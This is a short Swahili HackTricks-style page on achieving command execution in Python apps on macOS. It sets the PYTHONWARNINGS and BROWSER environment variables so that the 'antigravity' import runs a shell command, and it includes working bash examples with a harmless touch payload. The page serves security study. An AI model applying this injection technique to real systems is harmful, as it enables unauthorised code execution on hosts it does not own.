# Injection ya Application za Python kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## Kupitia environment variables za `PYTHONWARNINGS` na `BROWSER`

Ikiwa mshambuliaji anaweza kudhibiti mazingira ya process ya Python, mchanganyiko wa `PYTHONWARNINGS` na `BROWSER` unaweza kuanzisha utekelezaji wa amri Python inapo-import module ya `antigravity` wakati ikichakata option ya warning iliyoundwa mahsusi. Mbinu hii inategemea `antigravity` kufungua URL kwa kutumia module ya Python ya `webbrowser`, ambayo huzingatia environment variable ya `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hacking kwa kutumia Environment Variables - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
